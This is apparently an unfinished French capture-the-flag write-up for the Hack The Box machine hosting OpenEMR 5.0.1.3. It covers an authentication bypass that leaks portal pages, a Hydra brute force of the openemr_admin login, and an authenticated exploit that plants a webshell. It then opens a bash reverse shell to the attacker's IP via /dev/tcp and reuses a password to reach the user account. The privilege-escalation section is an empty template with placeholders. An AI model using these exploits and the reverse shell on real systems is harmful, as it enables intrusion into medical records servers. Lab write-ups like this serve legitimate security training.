php/webapps/49998.py — OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)
php/webapps/50017.py — OpenEMR 5.0.1.3 - Authentication Bypass
php/webapps/45161.py — OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)
```

Il est préférable de créer un sous-répertoire dédié afin de regrouper les exploits OpenEMR, puis d’y copier les trois scripts retenus :

```bash
mkdir hms
cd hms

searchsploit -m php/webapps/49998.py
searchsploit -m php/webapps/50017.py
searchsploit -m php/webapps/45161.py
```



Les exploits `49998.py` et `45161.py` nécessitent des identifiants OpenEMR valides. À ce stade, tu n’en possèdes pas encore.

L’exploit `50017.py` est donc la piste la plus logique à examiner en premier, puisqu’il te permet de contourner l’authentification du portail patient et pourrait te révéler des informations utiles sur les comptes présents dans l’application.



### Contournement de l’authentification du portail patient

Tu commences par examiner le code source de l’exploit `50017.py`. 

Son en-tête décrit une vulnérabilité permettant à un utilisateur non authentifié de contourner la connexion du portail patient. 

Le script précise qu’en accédant d’abord à la page d’inscription du portail, il devient possible de demander plusieurs pages normalement réservées à un patient authentifié.

Le commentaire présent dans le code source cite notamment les pages suivantes :

```
add_edit_event_user.php
find_appt_popup_user.php
get_allergies.php
get_amendments.php
get_lab_results.php
get_medications.php
get_patient_documents.php
get_problems.php
get_profile.php
portal_payment.php
messaging/messages.php
messaging/secure_chat.php
report/pat_ledger.php
report/portal_custom_report.php
report/portal_patient_report.php
```

L’objectif est donc de récupérer ces différentes pages, puis de les examiner à la recherche d’informations utiles, comme des comptes utilisateurs et, éventuellement, leurs identifiants.

Pour regrouper proprement les fichiers récupérés, tu crées un sous-répertoire dédié à cet exploit :

```
mkdir -p 50017
```

Avant de lancer l’exploitation, tu affiches l’aide du script afin d’identifier les paramètres attendus :

```bash
python3 50017.py -h
usage: 50017.py [-h] [-T IP] [-P PORT] [-U OPENEMRPATH] [-R PATHTOGET]

OpenEMR Authentication bypass

options:
  -h, --help            show this help message and exit
  -T, --IP IP
  -P, --PORT PORT
  -U, --Openemrpath OPENEMRPATH
  -R, --PathToGet PATHTOGET
```

Le script attend donc :

- l’adresse de la cible avec `-T` ;
- le port utilisé avec `-P` ;
- le chemin de base de l’installation OpenEMR avec `-U` ;
- la ressource à récupérer avec `-R`.

Le commentaire du script précise que les fichiers cités sont des *pages in the portal directory*. Comme le portail patient est accessible sous `/portal/`, tu construis leur chemin complet en les préfixant par ce répertoire.

Pour vérifier le fonctionnement du contournement, tu commences par la première page de la liste :

```txt
/portal/add_edit_event_user.php
```

Tu lances l’exploit avec :

```bash
python3 50017.py \
  -T hms.htb \
  -P 80 \
  -U '' \
  -R '/portal/add_edit_event_user.php' \
  | tee 50017/add_edit_event_user.txt
```

L’option `-U ''` indique que l’installation OpenEMR est directement accessible à la racine de `hms.htb`.

La réponse est affichée dans le terminal et enregistrée simultanément dans :

```
50017/add_edit_event_user.txt
```

Le script confirme tout d’abord que la cible est vulnérable :

```
[*] Checking vulnerability:

[+] Host Vulnerable. Proceeding exploit

[+] Results:
```

Il récupère ensuite le code HTML complet de la page demandée. La présence du formulaire intitulé `Add New Event` confirme que le contournement permet bien d’accéder à cette ressource du portail patient. 

Dans la réponse, une information mérite déjà d’être relevée :

```html
<td nowrap>
   <b>Provider:</b>
</td>
<td style='padding:0px 5px 5px 0' nowrap>
  <select class="form-control" name='form_provider_ae' id='form_provider_ae' onchange='change_provider();'>
    <option value='1'>Administrator, Administrator</option>
  </select>
</td>
```

Cette valeur apparaît dans le champ **Provider** du formulaire de rendez-vous. Elle indique la présence d’un compte administrateur dans OpenEMR, sans encore révéler son nom d’utilisateur ni ses identifiants.

Le premier test ayant confirmé le fonctionnement du contournement, tu peux maintenant automatiser la récupération des autres pages mentionnées dans le code source de l’exploit.

Comme `add_edit_event_user.php` a déjà été téléchargée, tu l’exclus de la liste et utilises une boucle pour récupérer toutes les ressources restantes. Chaque réponse est enregistrée dans le sous-répertoire `50017` :

```bash
pages=(
  find_appt_popup_user.php
  get_allergies.php
  get_amendments.php
  get_lab_results.php
  get_medications.php
  get_patient_documents.php
  get_problems.php
  get_profile.php
  portal_payment.php
  messaging/messages.php
  messaging/secure_chat.php
  report/pat_ledger.php
  report/portal_custom_report.php
  report/portal_patient_report.php
)

for page in "${pages[@]}"; do
  output="50017/${page//\//_}"
  output="${output%.php}.txt"

  python3 50017.py \
    -T hms.htb \
    -P 80 \
    -U '' \
    -R "/portal/$page" \
    | tee "$output"
done.
```

La substitution suivante remplace les `/` présents dans certains chemins par des `_` :

```bash
${page//\//_}
```

Par exemple, la page :

```
messaging/messages.php
```

est enregistrée sous le nom :

```
50017/messaging_messages.txt
```

Une fois toutes les pages récupérées, tu recherches les occurrences du terme `administrator` dans l’ensemble des fichiers :

```bash
grep -Rni 'administrator' 50017/
50017/messaging_messages.txt:67:    $scope.authrecips = [{"userid":"openemr_admin","username":"Administrator Administrator"}];
50017/add_edit_event_user.txt:86:    <option value='1'>Administrator, Administrator</option>
```

La seconde ligne correspond à l’information déjà observée dans le formulaire de rendez-vous.

La première est plus intéressante, car elle révèle directement le nom d’utilisateur associé au compte administrateur :

```
openemr_admin
```

Tu disposes désormais d’un nom d’utilisateur OpenEMR valide. En revanche, les exploits authentifiés `49998.py` et `45161.py` nécessitent également le mot de passe de ce compte.

La prochaine étape consiste donc à analyser précisément le formulaire de connexion d’OpenEMR afin de préparer une recherche du mot de passe de `openemr_admin`.

### Identification des paramètres Hydra avec Burp Suite

Pour trouver le mot de passe du compte `openemr_admin`, tu vas utiliser **Hydra** afin de tester automatiquement une liste de mots de passe sur le formulaire de connexion d’OpenEMR.

Pour une présentation plus générale de l’outil et de son utilisation avec les formulaires HTTP `POST`, tu peux consulter ce tutoriel en français [Hydra Cheat Sheet](https://hackops.fr/hydra-cheat-sheet/).

Hydra doit connaître :

- le nom d’utilisateur ;
- la liste de mots de passe à tester ;
- la cible ;
- l’URL vers laquelle les identifiants sont envoyés ;
- les champs transmis dans la requête ;
- un marqueur permettant de reconnaître un échec d’authentification.

Pour récupérer tous ces éléments, tu interceptes une tentative de connexion avec Burp Suite en utilisant le compte `openemr_admin` et un mot de passe volontairement incorrect, puis tu envoies la requête dans **Repeater**.

![Tentative de connexion OpenEMR avec un mauvais mot de passe dans Burp Suite](hms-htb-loginbad-password-burp-suite.png)

La requête utilise la méthode `POST` vers :

```text
/interface/main/main_screen.php?auth=login&site=default
```



Son corps contient les paramètres suivants :

```bash
new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=test
```

Le nom d’utilisateur étant déjà connu, seule la valeur de `clearPass` devra varier pendant l’attaque Hydra :

```bash
clearPass=^PASS^
```

La partie correspondant aux données du formulaire devient donc :

```bash
new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=^PASS^
```

La réponse à cette tentative incorrecte contient l’instruction JavaScript suivante :

```bash
w.top.location.href = '/interface/login_screen.php?error=1&site=';
```

Le texte `error=1` est donc un marqueur fiable d’échec d’authentification. La condition à utiliser avec Hydra sera :

```
F=error=1
```



### Attaque par dictionnaire avec Hydra

Les éléments nécessaires à la construction de la commande Hydra sont maintenant connus :

```text
Utilisateur        : openemr_admin
Cible              : hms.htb
Méthode            : POST
URL                 : /interface/main/main_screen.php?auth=login&site=default
Champ utilisateur  : authUser
Champ mot de passe : clearPass
Marqueur d’échec   : error=1
```



Avant d’utiliser une wordlist volumineuse, il est préférable de vérifier la commande avec une courte liste de mots de passe :

```bash
mkdir -p hydra

cat > hydra/test-passwords.txt <<'EOF'
test
password
admin
H@v3_fun
EOF
```

Cette première liste ne vise pas encore à trouver le mot de passe. Elle permet surtout de confirmer que Hydra reproduit correctement la requête observée dans Burp Suite et interprète correctement le marqueur d’échec.

Tu lances le test avec :

```bash
hydra -l openemr_admin \
  -P hydra/test-passwords.txt \
  hms.htb \
  http-post-form \
  '/interface/main/main_screen.php?auth=login&site=default:new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=^PASS^:F=error=1' \
  -t 1 \
  -V
```

L’option `-l` précise le nom d’utilisateur déjà connu, tandis que `-P` indique le fichier contenant les mots de passe à tester.

Le module `http-post-form` demande ensuite trois éléments séparés par des deux-points :

```text
<URL>:<données envoyées>:<condition d’échec>
```

Dans cette commande :

```url
/interface/main/main_screen.php?auth=login&site=default
```

correspond à l’URL appelée par le formulaire ;

```bash
new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=^PASS^
```

reproduit le corps de la requête `POST`, Hydra remplaçant `^PASS^` par chaque mot de passe de la liste ;

```bash
F=error=1
```

indique que la présence de `error=1` dans la réponse correspond à un échec d’authentification.

L’option `-t 1` limite Hydra à une seule tâche simultanée pendant cette phase de validation, tandis que `-V` affiche chaque tentative effectuée.

Voici le résultat :

```bash
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at [date]
[DATA] max 1 task per 1 server, overall 1 task, 4 login tries (l:1/p:4), ~4 tries per task
[DATA] attacking http-post-form://hms.htb:80/interface/main/main_screen.php?auth=login&site=default:new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=^PASS^:F=error=1
[ATTEMPT] target hms.htb - login "openemr_admin" - pass "test" - 1 of 4 [child 0] (0/0)
[ATTEMPT] target hms.htb - login "openemr_admin" - pass "password" - 2 of 4 [child 0] (0/0)
[ATTEMPT] target hms.htb - login "openemr_admin" - pass "admin" - 3 of 4 [child 0] (0/0)
[ATTEMPT] target hms.htb - login "openemr_admin" - pass "H@v3_fun" - 4 of 4 [child 0] (0/0)
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at [date]

```

Comme la petite wordlist ne contient pas a priori le mot de passe recherché, Hydra traite correctement chacune de ses entrées comme un échec. 

La syntaxe de la commande et le marqueur `F=error=1` sont donc validés.

Tu peux maintenant préparer une liste plus importante en extrayant les 10 000 premiers mots de passe de RockYou :

```bash
head -n 10000 /usr/share/wordlists/rockyou.txt \
  > hydra/rockyou-10000.txt
```

Tu relances ensuite Hydra avec cette nouvelle liste :

```bash
hydra -l openemr_admin \
  -P hydra/rockyou-10000.txt \
  hms.htb \
  http-post-form \
  '/interface/main/main_screen.php?auth=login&site=default:new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=^PASS^:F=error=1' \
  -t 1 \
  -V
```

L’attaque peut prendre plusieurs minutes, notamment selon la vitesse de réponse du serveur et la position du mot de passe dans la liste. 

Hydra finit par identifier un mot de passe valide pour le compte :

```text
openemr_admin:xxxxxx
```



Avant d’utiliser ces identifiants avec les exploits OpenEMR authentifiés, tu vérifies s’ils peuvent également correspondre à un compte local accessible en SSH :

```bash
ssh openemr_admin@cache.htb
```

Le mot de passe découvert avec Hydra n’est toutefois pas accepté. Le compte `openemr_admin` semble donc être limité à l’application OpenEMR.

Tu disposes désormais des identifiants nécessaires pour tester les exploits OpenEMR authentifiés `49998.py` et `45161.py`.

### Analyse des exploits authentifiés

Tu peux donc passer à l’étude des deux exploits authentifiés retenus précédemment :

```txt
49998.py — OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)
45161.py — OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)
```

Comme pour `50017.py`, tu vas commencer par examiner leur code source afin de comprendre leur fonctionnement, les chemins qu’ils ciblent et les paramètres qu’ils attendent avant de les exécuter.

Il est préférable d’isoler les deux exploits dans des sous-répertoires distincts. Cette organisation permet de conserver séparément les scripts originaux, leurs éventuelles versions adaptées et les résultats obtenus lors des différents tests.

Tu te places d’abord dans le répertoire de travail `hms` :

```bash
cd hms
```

Tu crées ensuite un sous-répertoire pour chacun des deux exploits, puis tu y copies les scripts correspondants :

```bash
mkdir -p 49998 45161

cd 49998
searchsploit -m php/webapps/49998.py

cd ../45161
searchsploit -m php/webapps/45161.py
```

L’arborescence de travail contient maintenant un répertoire distinct pour chaque exploit :

```
hms/
├── 49998/
│   └── 49998.py
└── 45161/
    └── 45161.py
```

Tu peux commencer par analyser `49998.py`, puis examiner `45161.py` si la première tentative ne permet pas d’obtenir une exécution de commandes exploitable.



#### Analyse de l’exploit `49998.py`

Tu commences par te placer dans le répertoire dédié à l’exploit :

```bash
cd hms/49998
```



Comme pour l’exploit précédent, la première étape consiste à examiner le code source de `49998.py` afin de comprendre précisément son fonctionnement avant de l’exécuter.

L’en-tête indique que le script exploite la vulnérabilité suivante :

```txt
CVE-2018-15139
```

Le script s’authentifie avec un compte OpenEMR valide, puis tente d’utiliser la page suivante :

```url
/interface/super/manage_site_files.php
```

Cette fonctionnalité permet normalement de gérer les fichiers du site. L’exploit cherche à en abuser pour envoyer une webshell nommée :

```txt
shell.php
```

Le code contient directement une webshell complète de type `p0wny@shell`, qui doit être déposée dans le répertoire des images du site par défaut.

Si l’envoi réussit, le script prévoit de rendre la webshell accessible à l’adresse suivante :

```url
http://hms.htb/sites/default/images/shell.php
```

Avant de lancer l’exploitation, tu affiches l’aide du script afin d’identifier les paramètres attendus :

```bash
python3 49998.py -h
```

Ce qui donne :

```bash
/hms/49998/49998.py:25: SyntaxWarning: invalid escape sequence '\ '
  / _ \ _ __   ___ _ __ | ____|  \/  |  _ \          | ___| / _ \ / | |___ /

 ___                   _____ __  __ ____            ____   ___   _   _____
  / _ \ _ __   ___ _ __ | ____|  \/  |  _ \          | ___| / _ \ / | |___ /
 | | | | '_ \ / _ \ '_ \|  _| | |\/| | |_) |  _____  |___ \| | | || |   |_  | |_| | |_) |  __/ | | | |___| |  | |  _ <  |_____|  ___) | |_| || |_ ___) |
  \___/| .__/ \___|_| |_|_____|_|  |_|_| \_\         |____(_)___(_)_(_)____/
       |_|

                    _____            _       _ _
                    | ____|_  ___ __ | | ___ (_) |_
                    |  _| \ \/ / '_ \| |/ _ \| | __|
                    | |___ >  <| |_) | | (_) | | |_
                    |_____/_/\_\ .__/|_|\___/|_|\__|
                               |_|


usage: 49998.py [-h] [-T IP] [-P PORT] [-U PATH] [-u USERNAME] [-p PASSWORD]

OpenEMR Remote Code Execution

options:
  -h, --help            show this help message and exit
  -T, --IP IP
  -P, --PORT PORT
  -U, --PATH PATH
  -u, --USERNAME USERNAME
  -p, --PASSWORD PASSWORD
 
```

L’avertissement `SyntaxWarning` concerne uniquement une séquence d’échappement présente dans la bannière ASCII du script. Il n’empêche pas l’affichage de l’aide ni, a priori, son exécution.

Les paramètres attendus sont :

```
-T  adresse ou nom d’hôte de la cible
-P  port HTTP
-U  chemin de base de l’installation OpenEMR
-u  nom d’utilisateur OpenEMR
-p  mot de passe OpenEMR
```

Dans notre cas, l’installation OpenEMR est accessible directement à la racine de `hms.htb`. Le paramètre `-U` pourra donc recevoir une valeur vide.

La commande d’exploitation prendra ainsi la forme suivante :

```bash
python3 49998.py \
  -T hms.htb \
  -P 80 \
  -U '' \
  -u openemr_admin \
  -p '<mot_de_passe_trouvé>'
```



Le résultat montre que l’exploitation avec `49998.py` fonctionne finalement sur la cible : la webshell est accessible et permet d’exécuter des commandes en tant que `www-data`.

Tu peux poursuivre le writeup ainsi :

```
L’exploit s’authentifie avec le compte `openemr_admin`, puis envoie une webshell `p0wny@shell` dans le répertoire des images du site OpenEMR.

Le script indique que la webshell doit être accessible à l’adresse suivante :

```text
http://hms.htb/sites/default/images/shell.php
```

En ouvrant cette URL dans le navigateur, tu obtiens bien l’interface de la webshell.

![Webshell p0wny@shell exécutant la commande id en tant que www-data](cache-htb-hms-htb-p0wny-shell.png)



Pour vérifier l’exécution de commandes, tu lances :

```
id
```

La réponse confirme que les commandes sont exécutées avec les privilèges de l’utilisateur du serveur web :

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

L’exploit `49998.py` permet donc d’obtenir directement une exécution de commandes en tant que `www-data`.

### Identification des utilisateurs locaux

Depuis la webshell, tu examines le contenu du répertoire `/home` :

```
ls -l /home
total 8
drwxr-xr-x 11 ash   ash   4096 May  6  2020 ash
drwxr-x---  5 luffy luffy 4096 May  6  2020 luffy
```

Deux utilisateurs locaux sont présents sur la machine :

```
ash
luffy
```

Le répertoire personnel de `ash` est accessible en lecture. Tu peux donc en examiner le contenu :

```
ls -l /home/ash
total 28
drwxrwxr-x 2 root root 4096 May  5  2020 Desktop
drwxrwxr-x 2 root root 4096 Oct  9  2019 Documents
drwxrwxr-x 2 root root 4096 Sep 18  2019 Downloads
drwxrwxr-x 2 root root 4096 Sep 18  2019 Music
drwxrwxr-x 2 root root 4096 Sep 18  2019 Pictures
drwxrwxr-x 2 root root 4096 Oct  9  2019 Public
-r-x------ 1 ash  ash    33 Jul 31 08:11 user.txt
```

Le fichier `user.txt` est bien présent, mais ses permissions montrent qu’il ne peut être lu que par `ash` :

```
-r-x------ 1 ash ash 33 Jul 31 08:11 user.txt
```

L’accès obtenu en tant que `www-data` ne suffit donc pas encore pour lire le flag utilisateur.

Les identifiants `ash:H@v3_fun`, découverts au début de l’énumération, n’ont encore permis ni une connexion SSH ni un accès à OpenEMR. Comme le fichier `user.txt` appartient à `ash`, c’est le moment de tester une réutilisation de ce mot de passe directement depuis la machine :

```
su - ash
```

La tentative échoue toutefois avec le message suivant :

```
su: must be run from a terminal
```

La webshell p0wny@shell permet bien d’exécuter des commandes, mais elle ne fournit pas de véritable terminal interactif. Il faut donc obtenir un reverse shell avant de pouvoir utiliser correctement `su`.

### Obtention d’un reverse shell en tant que `www-data`

Tu commences par lancer un listener sur Kali :

```bash
rlwrap -cAr nc -lvnp 4444
```

Depuis p0wny@shell, tu exécutes ensuite un reverse shell Bash vers l’adresse IP de l’interface `tun0` de Kali :

```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.96/4444 0>&1'
```

Le listener reçoit alors une connexion depuis la cible :

```bash
connect to [10.10.15.96] from [10.129.x.x]
```

Tu obtiens un shell en tant que `www-data` :

```bash
www-data@cache:/var/www/hms.htb/public_html/sites/default/images$
```

Ce shell reste encore rudimentaire. Tu le stabilises d’abord avec Python :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Tu places ensuite le shell en arrière-plan avec :

```
Ctrl+Z
```

Puis, dans ton terminal Kali, tu exécutes :

```bash
stty raw -echo
fg
```

De retour dans le reverse shell, tu réinitialises le terminal :

```bash
reset
```

Lorsque le type de terminal est demandé, tu réponds :

```bash
xterm
```

Enfin, tu définis explicitement la variable `TERM` :

```bash
export TERM=xterm
```

Tu disposes maintenant d’un terminal suffisamment interactif pour réessayer le passage vers le compte `ash`.

```bash
su - ash
```

Lorsque le mot de passe est demandé, tu saisis celui découvert au début de l’énumération :

```
H@v3_fun
```

Cette fois, l’authentification réussit et tu obtiens un shell sous le compte `ash` :

```
ash@cache:~$
```

Tu peux vérifier ton identité avec :

```
id
uid=1000(ash) gid=1000(ash) groups=1000(ash)

```



Puis lire le flag utilisateur :

```
cat /home/ash/user.txt
8e33xxxxxxxxxxxxxxxxxxxxxxxxxx097b
```

La partie **Prise pied** s’arrête ici, avec l’obtention du shell de `ash` et la lecture de `user.txt`.

## Escalade de privilèges

{{< escalade-intro-v2 user="ash" >}}


### Observation passive avec pspy64

```bash
./pspy64
```

Si système 32 bits :

```bash
./pspy32
```

### Vérification sudo

```bash
sudo -l
```

### Exploration du contexte utilisateur

```bash
whoami
id
pwd
uname -a
hostname
find /home /opt -type f -readable 2>/dev/null
```

### Capabilities

```bash
getcap -r / 2>/dev/null
```

### SUID

```bash
python3 suid3num.py
```

Alternative :

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Services locaux

```bash
ss -tulnp
```

Alternative :

```bash
netstat -tulnp
```

### Recherche d’un service derrière un port local

Exemple avec le port `8080` :

```bash
grep -r ':8080' /etc 2>/dev/null
```

Recherche élargie :

```bash
grep -r '8080' /etc 2>/dev/null
```

### Tunnel SSH vers un service local

Exemple avec un service local sur `127.0.0.1:8080` :

```bash
ssh -L 8080:127.0.0.1:8080 user@target
```

Accès depuis Kali :

```text
http://localhost:8080
```

### Linpeas

```bash
./linpeas.sh
```

### Dernier recours : le kernel

```bash
uname -a
./les.sh
```

### Conclusion de l’énumération privilege escalation

À la fin de cette phase, tu peux résumer les pistes testées :

* sudo
* contexte utilisateur
* fichiers lisibles
* capabilities
* SUID
* cron et timers
* services locaux
* LinPEAS
* kernel

Dans ce cas précis, la piste exploitable est :

```text
<résumer ici la piste réellement exploitée>
```

### Exploitation de la piste identifiée

Tu exploites ensuite la mauvaise configuration identifiée pendant l’énumération.

```bash
<commandes d’exploitation>
```

Tu confirmes l’élévation de privilèges :

```bash
whoami
id
hostname
```

Résultat attendu :

```text
root
uid=0(root) gid=0(root) groups=0(root)
machine
```

### root.txt

Une fois root, tu peux lire le flag final :

```bash
cat /root/root.txt
```

Cette étape termine l’escalade de privilèges.

## Conclusion

- Récapitulatif de la chaîne d'attaque (du scan à root).
- Vulnérabilités exploitées & combinaisons.
- Conseils de mitigation et détection.
- Points d'apprentissage personnels.

---

## Pièces jointes (optionnel)

- Scripts, one-liners, captures, notes.  
- Arbo conseillée : `files/<nom_ctf>/…`

{{< feedback >}}